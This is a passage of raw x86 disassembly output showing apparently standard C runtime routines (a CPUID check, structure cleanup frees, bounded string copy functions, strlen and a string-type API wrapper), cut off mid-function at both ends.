  406074:	35 00 00 20 00       	xor    $0x200000,%eax
  406079:	50                   	push   %eax
  40607a:	9d                   	popf
  40607b:	9c                   	pushf
  40607c:	5a                   	pop    %edx
  40607d:	2b d1                	sub    %ecx,%edx
  40607f:	74 1f                	je     0x4060a0
  406081:	51                   	push   %ecx
  406082:	9d                   	popf
  406083:	33 c0                	xor    %eax,%eax
  406085:	0f a2                	cpuid
  406087:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40608a:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40608d:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406090:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406093:	b8 01 00 00 00       	mov    $0x1,%eax
  406098:	0f a2                	cpuid
  40609a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40609d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060a0:	5b                   	pop    %ebx
  4060a1:	f7 45 fc 00 00 00 04 	testl  $0x4000000,-0x4(%ebp)
  4060a8:	74 0e                	je     0x4060b8
  4060aa:	e8 5e ff ff ff       	call   0x40600d
  4060af:	85 c0                	test   %eax,%eax
  4060b1:	74 05                	je     0x4060b8
  4060b3:	33 c0                	xor    %eax,%eax
  4060b5:	40                   	inc    %eax
  4060b6:	eb 02                	jmp    0x4060ba
  4060b8:	33 c0                	xor    %eax,%eax
  4060ba:	5b                   	pop    %ebx
  4060bb:	c9                   	leave
  4060bc:	c3                   	ret
  4060bd:	e8 9b ff ff ff       	call   0x40605d
  4060c2:	a3 04 d9 40 00       	mov    %eax,0x40d904
  4060c7:	33 c0                	xor    %eax,%eax
  4060c9:	c3                   	ret
  4060ca:	56                   	push   %esi
  4060cb:	8b 74 24 08          	mov    0x8(%esp),%esi
  4060cf:	85 f6                	test   %esi,%esi
  4060d1:	0f 84 81 01 00 00    	je     0x406258
  4060d7:	ff 76 04             	push   0x4(%esi)
  4060da:	e8 b0 cb ff ff       	call   0x402c8f
  4060df:	ff 76 08             	push   0x8(%esi)
  4060e2:	e8 a8 cb ff ff       	call   0x402c8f
  4060e7:	ff 76 0c             	push   0xc(%esi)
  4060ea:	e8 a0 cb ff ff       	call   0x402c8f
  4060ef:	ff 76 10             	push   0x10(%esi)
  4060f2:	e8 98 cb ff ff       	call   0x402c8f
  4060f7:	ff 76 14             	push   0x14(%esi)
  4060fa:	e8 90 cb ff ff       	call   0x402c8f
  4060ff:	ff 76 18             	push   0x18(%esi)
  406102:	e8 88 cb ff ff       	call   0x402c8f
  406107:	ff 36                	push   (%esi)
  406109:	e8 81 cb ff ff       	call   0x402c8f
  40610e:	ff 76 20             	push   0x20(%esi)
  406111:	e8 79 cb ff ff       	call   0x402c8f
  406116:	ff 76 24             	push   0x24(%esi)
  406119:	e8 71 cb ff ff       	call   0x402c8f
  40611e:	ff 76 28             	push   0x28(%esi)
  406121:	e8 69 cb ff ff       	call   0x402c8f
  406126:	ff 76 2c             	push   0x2c(%esi)
  406129:	e8 61 cb ff ff       	call   0x402c8f
  40612e:	ff 76 30             	push   0x30(%esi)
  406131:	e8 59 cb ff ff       	call   0x402c8f
  406136:	ff 76 34             	push   0x34(%esi)
  406139:	e8 51 cb ff ff       	call   0x402c8f
  40613e:	ff 76 1c             	push   0x1c(%esi)
  406141:	e8 49 cb ff ff       	call   0x402c8f
  406146:	ff 76 38             	push   0x38(%esi)
  406149:	e8 41 cb ff ff       	call   0x402c8f
  40614e:	ff 76 3c             	push   0x3c(%esi)
  406151:	e8 39 cb ff ff       	call   0x402c8f
  406156:	83 c4 40             	add    $0x40,%esp
  406159:	ff 76 40             	push   0x40(%esi)
  40615c:	e8 2e cb ff ff       	call   0x402c8f
  406161:	ff 76 44             	push   0x44(%esi)
  406164:	e8 26 cb ff ff       	call   0x402c8f
  406169:	ff 76 48             	push   0x48(%esi)
  40616c:	e8 1e cb ff ff       	call   0x402c8f
  406171:	ff 76 4c             	push   0x4c(%esi)
  406174:	e8 16 cb ff ff       	call   0x402c8f
  406179:	ff 76 50             	push   0x50(%esi)
  40617c:	e8 0e cb ff ff       	call   0x402c8f
  406181:	ff 76 54             	push   0x54(%esi)
  406184:	e8 06 cb ff ff       	call   0x402c8f
  406189:	ff 76 58             	push   0x58(%esi)
  40618c:	e8 fe ca ff ff       	call   0x402c8f
  406191:	ff 76 5c             	push   0x5c(%esi)
  406194:	e8 f6 ca ff ff       	call   0x402c8f
  406199:	ff 76 60             	push   0x60(%esi)
  40619c:	e8 ee ca ff ff       	call   0x402c8f
  4061a1:	ff 76 64             	push   0x64(%esi)
  4061a4:	e8 e6 ca ff ff       	call   0x402c8f
  4061a9:	ff 76 68             	push   0x68(%esi)
  4061ac:	e8 de ca ff ff       	call   0x402c8f
  4061b1:	ff 76 6c             	push   0x6c(%esi)
  4061b4:	e8 d6 ca ff ff       	call   0x402c8f
  4061b9:	ff 76 70             	push   0x70(%esi)
  4061bc:	e8 ce ca ff ff       	call   0x402c8f
  4061c1:	ff 76 74             	push   0x74(%esi)
  4061c4:	e8 c6 ca ff ff       	call   0x402c8f
  4061c9:	ff 76 78             	push   0x78(%esi)
  4061cc:	e8 be ca ff ff       	call   0x402c8f
  4061d1:	ff 76 7c             	push   0x7c(%esi)
  4061d4:	e8 b6 ca ff ff       	call   0x402c8f
  4061d9:	83 c4 40             	add    $0x40,%esp
  4061dc:	ff b6 80 00 00 00    	push   0x80(%esi)
  4061e2:	e8 a8 ca ff ff       	call   0x402c8f
  4061e7:	ff b6 84 00 00 00    	push   0x84(%esi)
  4061ed:	e8 9d ca ff ff       	call   0x402c8f
  4061f2:	ff b6 88 00 00 00    	push   0x88(%esi)
  4061f8:	e8 92 ca ff ff       	call   0x402c8f
  4061fd:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  406203:	e8 87 ca ff ff       	call   0x402c8f
  406208:	ff b6 90 00 00 00    	push   0x90(%esi)
  40620e:	e8 7c ca ff ff       	call   0x402c8f
  406213:	ff b6 94 00 00 00    	push   0x94(%esi)
  406219:	e8 71 ca ff ff       	call   0x402c8f
  40621e:	ff b6 98 00 00 00    	push   0x98(%esi)
  406224:	e8 66 ca ff ff       	call   0x402c8f
  406229:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  40622f:	e8 5b ca ff ff       	call   0x402c8f
  406234:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  40623a:	e8 50 ca ff ff       	call   0x402c8f
  40623f:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  406245:	e8 45 ca ff ff       	call   0x402c8f
  40624a:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  406250:	e8 3a ca ff ff       	call   0x402c8f
  406255:	83 c4 2c             	add    $0x2c,%esp
  406258:	5e                   	pop    %esi
  406259:	c3                   	ret
  40625a:	56                   	push   %esi
  40625b:	8b 74 24 08          	mov    0x8(%esp),%esi
  40625f:	85 f6                	test   %esi,%esi
  406261:	74 35                	je     0x406298
  406263:	8b 06                	mov    (%esi),%eax
  406265:	3b 05 80 cb 40 00    	cmp    0x40cb80,%eax
  40626b:	74 07                	je     0x406274
  40626d:	50                   	push   %eax
  40626e:	e8 1c ca ff ff       	call   0x402c8f
  406273:	59                   	pop    %ecx
  406274:	8b 46 04             	mov    0x4(%esi),%eax
  406277:	3b 05 84 cb 40 00    	cmp    0x40cb84,%eax
  40627d:	74 07                	je     0x406286
  40627f:	50                   	push   %eax
  406280:	e8 0a ca ff ff       	call   0x402c8f
  406285:	59                   	pop    %ecx
  406286:	8b 76 08             	mov    0x8(%esi),%esi
  406289:	3b 35 88 cb 40 00    	cmp    0x40cb88,%esi
  40628f:	74 07                	je     0x406298
  406291:	56                   	push   %esi
  406292:	e8 f8 c9 ff ff       	call   0x402c8f
  406297:	59                   	pop    %ecx
  406298:	5e                   	pop    %esi
  406299:	c3                   	ret
  40629a:	56                   	push   %esi
  40629b:	8b 74 24 08          	mov    0x8(%esp),%esi
  40629f:	85 f6                	test   %esi,%esi
  4062a1:	74 7e                	je     0x406321
  4062a3:	8b 46 0c             	mov    0xc(%esi),%eax
  4062a6:	3b 05 8c cb 40 00    	cmp    0x40cb8c,%eax
  4062ac:	74 07                	je     0x4062b5
  4062ae:	50                   	push   %eax
  4062af:	e8 db c9 ff ff       	call   0x402c8f
  4062b4:	59                   	pop    %ecx
  4062b5:	8b 46 10             	mov    0x10(%esi),%eax
  4062b8:	3b 05 90 cb 40 00    	cmp    0x40cb90,%eax
  4062be:	74 07                	je     0x4062c7
  4062c0:	50                   	push   %eax
  4062c1:	e8 c9 c9 ff ff       	call   0x402c8f
  4062c6:	59                   	pop    %ecx
  4062c7:	8b 46 14             	mov    0x14(%esi),%eax
  4062ca:	3b 05 94 cb 40 00    	cmp    0x40cb94,%eax
  4062d0:	74 07                	je     0x4062d9
  4062d2:	50                   	push   %eax
  4062d3:	e8 b7 c9 ff ff       	call   0x402c8f
  4062d8:	59                   	pop    %ecx
  4062d9:	8b 46 18             	mov    0x18(%esi),%eax
  4062dc:	3b 05 98 cb 40 00    	cmp    0x40cb98,%eax
  4062e2:	74 07                	je     0x4062eb
  4062e4:	50                   	push   %eax
  4062e5:	e8 a5 c9 ff ff       	call   0x402c8f
  4062ea:	59                   	pop    %ecx
  4062eb:	8b 46 1c             	mov    0x1c(%esi),%eax
  4062ee:	3b 05 9c cb 40 00    	cmp    0x40cb9c,%eax
  4062f4:	74 07                	je     0x4062fd
  4062f6:	50                   	push   %eax
  4062f7:	e8 93 c9 ff ff       	call   0x402c8f
  4062fc:	59                   	pop    %ecx
  4062fd:	8b 46 20             	mov    0x20(%esi),%eax
  406300:	3b 05 a0 cb 40 00    	cmp    0x40cba0,%eax
  406306:	74 07                	je     0x40630f
  406308:	50                   	push   %eax
  406309:	e8 81 c9 ff ff       	call   0x402c8f
  40630e:	59                   	pop    %ecx
  40630f:	8b 76 24             	mov    0x24(%esi),%esi
  406312:	3b 35 a4 cb 40 00    	cmp    0x40cba4,%esi
  406318:	74 07                	je     0x406321
  40631a:	56                   	push   %esi
  40631b:	e8 6f c9 ff ff       	call   0x402c8f
  406320:	59                   	pop    %ecx
  406321:	5e                   	pop    %esi
  406322:	c3                   	ret
  406323:	8b 44 24 04          	mov    0x4(%esp),%eax
  406327:	85 c0                	test   %eax,%eax
  406329:	74 12                	je     0x40633d
  40632b:	83 e8 08             	sub    $0x8,%eax
  40632e:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  406334:	75 07                	jne    0x40633d
  406336:	50                   	push   %eax
  406337:	e8 53 c9 ff ff       	call   0x402c8f
  40633c:	59                   	pop    %ecx
  40633d:	c3                   	ret
  40633e:	8b 44 24 04          	mov    0x4(%esp),%eax
  406342:	53                   	push   %ebx
  406343:	33 db                	xor    %ebx,%ebx
  406345:	3b c3                	cmp    %ebx,%eax
  406347:	56                   	push   %esi
  406348:	57                   	push   %edi
  406349:	74 08                	je     0x406353
  40634b:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40634f:	3b fb                	cmp    %ebx,%edi
  406351:	77 1b                	ja     0x40636e
  406353:	e8 d5 e0 ff ff       	call   0x40442d
  406358:	6a 16                	push   $0x16
  40635a:	5e                   	pop    %esi
  40635b:	89 30                	mov    %esi,(%eax)
  40635d:	53                   	push   %ebx
  40635e:	53                   	push   %ebx
  40635f:	53                   	push   %ebx
  406360:	53                   	push   %ebx
  406361:	53                   	push   %ebx
  406362:	e8 93 ae ff ff       	call   0x4011fa
  406367:	83 c4 14             	add    $0x14,%esp
  40636a:	8b c6                	mov    %esi,%eax
  40636c:	eb 3d                	jmp    0x4063ab
  40636e:	8b 74 24 18          	mov    0x18(%esp),%esi
  406372:	3b f3                	cmp    %ebx,%esi
  406374:	75 04                	jne    0x40637a
  406376:	88 18                	mov    %bl,(%eax)
  406378:	eb d9                	jmp    0x406353
  40637a:	8b d0                	mov    %eax,%edx
  40637c:	38 1a                	cmp    %bl,(%edx)
  40637e:	74 04                	je     0x406384
  406380:	42                   	inc    %edx
  406381:	4f                   	dec    %edi
  406382:	75 f8                	jne    0x40637c
  406384:	3b fb                	cmp    %ebx,%edi
  406386:	74 ee                	je     0x406376
  406388:	8a 0e                	mov    (%esi),%cl
  40638a:	88 0a                	mov    %cl,(%edx)
  40638c:	42                   	inc    %edx
  40638d:	46                   	inc    %esi
  40638e:	3a cb                	cmp    %bl,%cl
  406390:	74 03                	je     0x406395
  406392:	4f                   	dec    %edi
  406393:	75 f3                	jne    0x406388
  406395:	3b fb                	cmp    %ebx,%edi
  406397:	75 10                	jne    0x4063a9
  406399:	88 18                	mov    %bl,(%eax)
  40639b:	e8 8d e0 ff ff       	call   0x40442d
  4063a0:	6a 22                	push   $0x22
  4063a2:	59                   	pop    %ecx
  4063a3:	89 08                	mov    %ecx,(%eax)
  4063a5:	8b f1                	mov    %ecx,%esi
  4063a7:	eb b4                	jmp    0x40635d
  4063a9:	33 c0                	xor    %eax,%eax
  4063ab:	5f                   	pop    %edi
  4063ac:	5e                   	pop    %esi
  4063ad:	5b                   	pop    %ebx
  4063ae:	c3                   	ret
  4063af:	cc                   	int3
  4063b0:	55                   	push   %ebp
  4063b1:	8b ec                	mov    %esp,%ebp
  4063b3:	56                   	push   %esi
  4063b4:	33 c0                	xor    %eax,%eax
  4063b6:	50                   	push   %eax
  4063b7:	50                   	push   %eax
  4063b8:	50                   	push   %eax
  4063b9:	50                   	push   %eax
  4063ba:	50                   	push   %eax
  4063bb:	50                   	push   %eax
  4063bc:	50                   	push   %eax
  4063bd:	50                   	push   %eax
  4063be:	8b 55 0c             	mov    0xc(%ebp),%edx
  4063c1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4063c4:	8a 02                	mov    (%edx),%al
  4063c6:	0a c0                	or     %al,%al
  4063c8:	74 09                	je     0x4063d3
  4063ca:	83 c2 01             	add    $0x1,%edx
  4063cd:	0f ab 04 24          	bts    %eax,(%esp)
  4063d1:	eb f1                	jmp    0x4063c4
  4063d3:	8b 75 08             	mov    0x8(%ebp),%esi
  4063d6:	83 c9 ff             	or     $0xffffffff,%ecx
  4063d9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4063dc:	83 c1 01             	add    $0x1,%ecx
  4063df:	8a 06                	mov    (%esi),%al
  4063e1:	0a c0                	or     %al,%al
  4063e3:	74 09                	je     0x4063ee
  4063e5:	83 c6 01             	add    $0x1,%esi
  4063e8:	0f a3 04 24          	bt     %eax,(%esp)
  4063ec:	73 ee                	jae    0x4063dc
  4063ee:	8b c1                	mov    %ecx,%eax
  4063f0:	83 c4 20             	add    $0x20,%esp
  4063f3:	5e                   	pop    %esi
  4063f4:	c9                   	leave
  4063f5:	c3                   	ret
  4063f6:	55                   	push   %ebp
  4063f7:	8b ec                	mov    %esp,%ebp
  4063f9:	53                   	push   %ebx
  4063fa:	56                   	push   %esi
  4063fb:	8b 75 08             	mov    0x8(%ebp),%esi
  4063fe:	33 db                	xor    %ebx,%ebx
  406400:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  406403:	57                   	push   %edi
  406404:	75 10                	jne    0x406416
  406406:	3b f3                	cmp    %ebx,%esi
  406408:	75 10                	jne    0x40641a
  40640a:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40640d:	75 12                	jne    0x406421
  40640f:	33 c0                	xor    %eax,%eax
  406411:	5f                   	pop    %edi
  406412:	5e                   	pop    %esi
  406413:	5b                   	pop    %ebx
  406414:	5d                   	pop    %ebp
  406415:	c3                   	ret
  406416:	3b f3                	cmp    %ebx,%esi
  406418:	74 07                	je     0x406421
  40641a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40641d:	3b fb                	cmp    %ebx,%edi
  40641f:	77 1b                	ja     0x40643c
  406421:	e8 07 e0 ff ff       	call   0x40442d
  406426:	6a 16                	push   $0x16
  406428:	5e                   	pop    %esi
  406429:	89 30                	mov    %esi,(%eax)
  40642b:	53                   	push   %ebx
  40642c:	53                   	push   %ebx
  40642d:	53                   	push   %ebx
  40642e:	53                   	push   %ebx
  40642f:	53                   	push   %ebx
  406430:	e8 c5 ad ff ff       	call   0x4011fa
  406435:	83 c4 14             	add    $0x14,%esp
  406438:	8b c6                	mov    %esi,%eax
  40643a:	eb d5                	jmp    0x406411
  40643c:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40643f:	75 04                	jne    0x406445
  406441:	88 1e                	mov    %bl,(%esi)
  406443:	eb ca                	jmp    0x40640f
  406445:	8b 55 10             	mov    0x10(%ebp),%edx
  406448:	3b d3                	cmp    %ebx,%edx
  40644a:	75 04                	jne    0x406450
  40644c:	88 1e                	mov    %bl,(%esi)
  40644e:	eb d1                	jmp    0x406421
  406450:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  406454:	8b c6                	mov    %esi,%eax
  406456:	75 0f                	jne    0x406467
  406458:	8a 0a                	mov    (%edx),%cl
  40645a:	88 08                	mov    %cl,(%eax)
  40645c:	40                   	inc    %eax
  40645d:	42                   	inc    %edx
  40645e:	3a cb                	cmp    %bl,%cl
  406460:	74 1e                	je     0x406480
  406462:	4f                   	dec    %edi
  406463:	75 f3                	jne    0x406458
  406465:	eb 19                	jmp    0x406480
  406467:	8a 0a                	mov    (%edx),%cl
  406469:	88 08                	mov    %cl,(%eax)
  40646b:	40                   	inc    %eax
  40646c:	42                   	inc    %edx
  40646d:	3a cb                	cmp    %bl,%cl
  40646f:	74 08                	je     0x406479
  406471:	4f                   	dec    %edi
  406472:	74 05                	je     0x406479
  406474:	ff 4d 14             	decl   0x14(%ebp)
  406477:	75 ee                	jne    0x406467
  406479:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40647c:	75 02                	jne    0x406480
  40647e:	88 18                	mov    %bl,(%eax)
  406480:	3b fb                	cmp    %ebx,%edi
  406482:	75 8b                	jne    0x40640f
  406484:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  406488:	75 0f                	jne    0x406499
  40648a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40648d:	6a 50                	push   $0x50
  40648f:	88 5c 06 ff          	mov    %bl,-0x1(%esi,%eax,1)
  406493:	58                   	pop    %eax
  406494:	e9 78 ff ff ff       	jmp    0x406411
  406499:	88 1e                	mov    %bl,(%esi)
  40649b:	e8 8d df ff ff       	call   0x40442d
  4064a0:	6a 22                	push   $0x22
  4064a2:	59                   	pop    %ecx
  4064a3:	89 08                	mov    %ecx,(%eax)
  4064a5:	8b f1                	mov    %ecx,%esi
  4064a7:	eb 82                	jmp    0x40642b
  4064a9:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4064ad:	53                   	push   %ebx
  4064ae:	33 db                	xor    %ebx,%ebx
  4064b0:	3b cb                	cmp    %ebx,%ecx
  4064b2:	56                   	push   %esi
  4064b3:	57                   	push   %edi
  4064b4:	74 08                	je     0x4064be
  4064b6:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4064ba:	3b fb                	cmp    %ebx,%edi
  4064bc:	77 1b                	ja     0x4064d9
  4064be:	e8 6a df ff ff       	call   0x40442d
  4064c3:	6a 16                	push   $0x16
  4064c5:	5e                   	pop    %esi
  4064c6:	89 30                	mov    %esi,(%eax)
  4064c8:	53                   	push   %ebx
  4064c9:	53                   	push   %ebx
  4064ca:	53                   	push   %ebx
  4064cb:	53                   	push   %ebx
  4064cc:	53                   	push   %ebx
  4064cd:	e8 28 ad ff ff       	call   0x4011fa
  4064d2:	83 c4 14             	add    $0x14,%esp
  4064d5:	8b c6                	mov    %esi,%eax
  4064d7:	eb 31                	jmp    0x40650a
  4064d9:	8b 74 24 18          	mov    0x18(%esp),%esi
  4064dd:	3b f3                	cmp    %ebx,%esi
  4064df:	75 04                	jne    0x4064e5
  4064e1:	88 19                	mov    %bl,(%ecx)
  4064e3:	eb d9                	jmp    0x4064be
  4064e5:	8b d1                	mov    %ecx,%edx
  4064e7:	8a 06                	mov    (%esi),%al
  4064e9:	88 02                	mov    %al,(%edx)
  4064eb:	42                   	inc    %edx
  4064ec:	46                   	inc    %esi
  4064ed:	3a c3                	cmp    %bl,%al
  4064ef:	74 03                	je     0x4064f4
  4064f1:	4f                   	dec    %edi
  4064f2:	75 f3                	jne    0x4064e7
  4064f4:	3b fb                	cmp    %ebx,%edi
  4064f6:	75 10                	jne    0x406508
  4064f8:	88 19                	mov    %bl,(%ecx)
  4064fa:	e8 2e df ff ff       	call   0x40442d
  4064ff:	6a 22                	push   $0x22
  406501:	59                   	pop    %ecx
  406502:	89 08                	mov    %ecx,(%eax)
  406504:	8b f1                	mov    %ecx,%esi
  406506:	eb c0                	jmp    0x4064c8
  406508:	33 c0                	xor    %eax,%eax
  40650a:	5f                   	pop    %edi
  40650b:	5e                   	pop    %esi
  40650c:	5b                   	pop    %ebx
  40650d:	c3                   	ret
  40650e:	cc                   	int3
  40650f:	cc                   	int3
  406510:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406514:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40651a:	74 24                	je     0x406540
  40651c:	8a 01                	mov    (%ecx),%al
  40651e:	83 c1 01             	add    $0x1,%ecx
  406521:	84 c0                	test   %al,%al
  406523:	74 4e                	je     0x406573
  406525:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40652b:	75 ef                	jne    0x40651c
  40652d:	05 00 00 00 00       	add    $0x0,%eax
  406532:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  406539:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  406540:	8b 01                	mov    (%ecx),%eax
  406542:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  406547:	03 d0                	add    %eax,%edx
  406549:	83 f0 ff             	xor    $0xffffffff,%eax
  40654c:	33 c2                	xor    %edx,%eax
  40654e:	83 c1 04             	add    $0x4,%ecx
  406551:	a9 00 01 01 81       	test   $0x81010100,%eax
  406556:	74 e8                	je     0x406540
  406558:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40655b:	84 c0                	test   %al,%al
  40655d:	74 32                	je     0x406591
  40655f:	84 e4                	test   %ah,%ah
  406561:	74 24                	je     0x406587
  406563:	a9 00 00 ff 00       	test   $0xff0000,%eax
  406568:	74 13                	je     0x40657d
  40656a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40656f:	74 02                	je     0x406573
  406571:	eb cd                	jmp    0x406540
  406573:	8d 41 ff             	lea    -0x1(%ecx),%eax
  406576:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40657a:	2b c1                	sub    %ecx,%eax
  40657c:	c3                   	ret
  40657d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  406580:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406584:	2b c1                	sub    %ecx,%eax
  406586:	c3                   	ret
  406587:	8d 41 fd             	lea    -0x3(%ecx),%eax
  40658a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40658e:	2b c1                	sub    %ecx,%eax
  406590:	c3                   	ret
  406591:	8d 41 fc             	lea    -0x4(%ecx),%eax
  406594:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406598:	2b c1                	sub    %ecx,%eax
  40659a:	c3                   	ret
  40659b:	55                   	push   %ebp
  40659c:	8b ec                	mov    %esp,%ebp
  40659e:	51                   	push   %ecx
  40659f:	51                   	push   %ecx
  4065a0:	a1 20 c0 40 00       	mov    0x40c020,%eax
  4065a5:	33 c5                	xor    %ebp,%eax
  4065a7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4065aa:	a1 b0 d6 40 00       	mov    0x40d6b0,%eax
  4065af:	53                   	push   %ebx
  4065b0:	56                   	push   %esi
  4065b1:	33 db                	xor    %ebx,%ebx
  4065b3:	3b c3                	cmp    %ebx,%eax
  4065b5:	57                   	push   %edi
  4065b6:	8b f9                	mov    %ecx,%edi
  4065b8:	75 3a                	jne    0x4065f4
  4065ba:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4065bd:	50                   	push   %eax
  4065be:	33 f6                	xor    %esi,%esi
  4065c0:	46                   	inc    %esi
  4065c1:	56                   	push   %esi
  4065c2:	68 b4 a4 40 00       	push   $0x40a4b4
  4065c7:	56                   	push   %esi
  4065c8:	ff 15 88 90 40 00    	call   *0x409088
  4065ce:	85 c0                	test   %eax,%eax
  4065d0:	74 08                	je     0x4065da
  4065d2:	89 35 b0 d6 40 00    	mov    %esi,0x40d6b0
  4065d8:	eb 34                	jmp    0x40660e
  4065da:	ff 15 c0 90 40 00    	call   *0x4090c0
  4065e0:	83 f8 78             	cmp    $0x78,%eax
  4065e3:	75 0a                	jne    0x4065ef
  4065e5:	6a 02                	push   $0x2
  4065e7:	58                   	pop    %eax
  4065e8:	a3 b0 d6 40 00       	mov    %eax,0x40d6b0
  4065ed:	eb 05                	jmp    0x4065f4
  4065ef:	a1 b0 d6 40 00       	mov    0x40d6b0,%eax
  4065f4:	83 f8 02             	cmp    $0x2,%eax
  4065f7:	0f 84 cf 00 00 00    	je     0x4066cc
  4065fd:	3b c3                	cmp    %ebx,%eax
  4065ff:	0f 84 c7 00 00 00    	je     0x4066cc
  406605:	83 f8 01             	cmp    $0x1,%eax
  406608:	0f 85 e8 00 00 00    	jne    0x4066f6
  40660e:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  406611:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  406614:	75 08                	jne    0x40661e
  406616:	8b 07                	mov    (%edi),%eax
  406618:	8b 40 04             	mov    0x4(%eax),%eax
  40661b:	89 45 18             	mov    %eax,0x18(%ebp)
  40661e:	8b 35 98 90 40 00    	mov    0x409098,%esi
  406624:	33 c0                	xor    %eax,%eax
  406626:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  406629:	53                   	push   %ebx
  40662a:	53                   	push   %ebx
  40662b:	ff 75 10             	push   0x10(%ebp)
  40662e:	0f 95 c0             	setne  %al
  406631:	ff 75 0c             	push   0xc(%ebp)
  406634:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  40663b:	50                   	push   %eax
  40663c:	ff 75 18             	push   0x18(%ebp)
  40663f:	ff d6                	call   *%esi
  406641:	8b f8                	mov    %eax,%edi
  406643:	3b fb                	cmp    %ebx,%edi
  406645:	0f 84 ab 00 00 00    	je     0x4066f6
  40664b:	7e 3c                	jle    0x406689
  40664d:	81 ff f0 ff ff 7f    	cmp    $0x7ffffff0,%edi
  406653:	77 34                	ja     0x406689
  406655:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  406659:	3d 00 04 00 00       	cmp    $0x400,%eax
  40665e:	77 13                	ja     0x406673
  406660:	e8 9b 11 00 00       	call   0x407800
  406665:	8b c4                	mov    %esp,%eax
  406667:	3b c3                	cmp    %ebx,%eax
  406669:	74 1c                	je     0x406687
  40666b:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  406671:	eb 11                	jmp    0x406684
  406673:	50                   	push   %eax
  406674:	e8 f3 c6 ff ff       	call   0x402d6c
  406679:	3b c3                	cmp    %ebx,%eax
  40667b:	59                   	pop    %ecx
  40667c:	74 09                	je     0x406687
  40667e:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  406684:	83 c0 08             	add    $0x8,%eax
  406687:	8b d8                	mov    %eax,%ebx
  406689:	85 db                	test   %ebx,%ebx
  40668b:	74 69                	je     0x4066f6
  40668d:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  406690:	50                   	push   %eax
  406691:	6a 00                	push   $0x0
  406693:	53                   	push   %ebx
  406694:	e8 c7 b8 ff ff       	call   0x401f60
  406699:	83 c4 0c             	add    $0xc,%esp
  40669c:	57                   	push   %edi
  40669d:	53                   	push   %ebx
  40669e:	ff 75 10             	push   0x10(%ebp)
  4066a1:	ff 75 0c             	push   0xc(%ebp)
  4066a4:	6a 01                	push   $0x1
  4066a6:	ff 75 18             	push   0x18(%ebp)
  4066a9:	ff d6                	call   *%esi
  4066ab:	85 c0                	test   %eax,%eax
  4066ad:	74 11                	je     0x4066c0
  4066af:	ff 75 14             	push   0x14(%ebp)
  4066b2:	50                   	push   %eax
  4066b3:	53                   	push   %ebx
  4066b4:	ff 75 08             	push   0x8(%ebp)
  4066b7:	ff 15 88 90 40 00    	call   *0x409088
  4066bd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4066c0:	53                   	push   %ebx
  4066c1:	e8 5d fc ff ff       	call   0x406323
  4066c6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4066c9:	59                   	pop    %ecx
  4066ca:	eb 75                	jmp    0x406741
  4066cc:	33 f6                	xor    %esi,%esi
  4066ce:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  4066d1:	75 08                	jne    0x4066db
  4066d3:	8b 07                	mov    (%edi),%eax
  4066d5:	8b 40 14             	mov    0x14(%eax),%eax
  4066d8:	89 45 1c             	mov    %eax,0x1c(%ebp)
  4066db:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  4066de:	75 08                	jne    0x4066e8
  4066e0:	8b 07                	mov    (%edi),%eax
  4066e2:	8b 40 04             	mov    0x4(%eax),%eax
  4066e5:	89 45 18             	mov    %eax,0x18(%ebp)
  4066e8:	ff 75 1c             	push   0x1c(%ebp)
  4066eb:	e8 4d 11 00 00       	call   0x40783d
  4066f0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4066f3:	59                   	pop    %ecx
  4066f4:	75 04                	jne    0x4066fa
  4066f6:	33 c0                	xor    %eax,%eax
  4066f8:	eb 47                	jmp    0x406741
  4066fa:	3b 45 18             	cmp    0x18(%ebp),%eax
  4066fd:	74 1e                	je     0x40671d
  4066ff:	53                   	push   %ebx
  406700:	53                   	push   %ebx
  406701:	8d 4d 10             	lea    0x10(%ebp),%ecx
  406704:	51                   	push   %ecx
